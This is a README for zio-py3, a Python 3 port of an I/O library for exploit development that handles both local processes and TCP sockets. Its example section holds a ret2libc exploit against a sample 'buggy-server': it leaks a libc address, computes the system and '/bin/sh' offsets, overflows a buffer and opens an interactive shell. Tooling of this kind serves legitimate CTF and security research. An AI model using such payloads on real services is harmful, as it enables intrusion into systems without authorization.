
# zio-py3

![Python package](https://github.com/taoky/zio/workflows/Python%20package/badge.svg)

Original `zio` project: <https://github.com/zTrix/zio>, by [zTrix](https://github.com/zTrix/)

This repository tries to turn `zio` into a Python 3 project (well `pwntools` is just too much heavyweight). It is still unstable now.

---

[zio] is an easy-to-use io library for pwning development, supporting an unified interface for local process pwning and TCP socket io.

The primary goal of [zio] is to provide unified io interface between process stdin/stdout and TCP socket io. So when you have done local pwning development, you only need to change the io target to pwn the remote server.

The following code illustrate the basic idea.

```python
from zio import *

if you_are_debugging_local_server_binary:
    io = zio('./buggy-server')            # used for local pwning development
elif you_are_pwning_remote_server:
    io = zio(('1.2.3.4', 1337))           # used to exploit remote service

io.write(your_awesome_ropchain_or_shellcode)
# hey, we got an interactive shell!
io.interact()
```

## License

[zio] use [SATA License](LICENSE.txt) (Star And Thank Author License), so you have to star this project before using. Read the [license](LICENSE.txt) carefully.

## Dependency

 - Linux or macOS
 - Python 3.5+
 - termcolor (optional, for color support)
    - $ pip install termcolor

## Installation

This is a single-file project so in most cases you can just download [zio.py](https://raw.githubusercontent.com/taoky/zio/master/zio.py) and start using.

pip is also supported, so you can also install by running 

```bash
$ pip install termcolor # for color support, optional
$ pip install zio
```

## Examples
 
```python
from zio import *
io = zio('./buggy-server')
# io = zio((pwn.server, 1337))

for i in range(1337):
    io.writeline('add ' + str(i))
    io.read_until('>>')

io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + b"A" * 49 + b"\nshow\n")
io.read_until(b'A' * 49)
libc_base = l32(io.read(4)) - 0x1a9960
libc_system = libc_base + 0x3ea70
libc_binsh = libc_base + 0x15fcbf
payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
io.write(b'info ' + payload + b"\nshow\nexit\n")
io.read_until(b">>")
# We've got a shell;-)
io.interact()
```

## Document

To be added... Please wait...

### about line break and carriage return

Just don't read '\n' or '\r', use `readline()` instead

## Thanks (Also references)

 - [zio](https://github.com/zTrix/zio)
 - [pexpect](https://github.com/pexpect/pexpect) I (zTrix) borrowed a lot of code from here
 - [sh](https://github.com/amoffat/sh)
 - python subprocess module
 - TTY related
   - http://linux.die.net/man/3/cfmakeraw
   - http://marcocorvi.altervista.org/games/lkpe/tty/tty.htm
   - http://www.linusakesson.net/programming/tty/


[zio]:https://github.com/taoky/zio
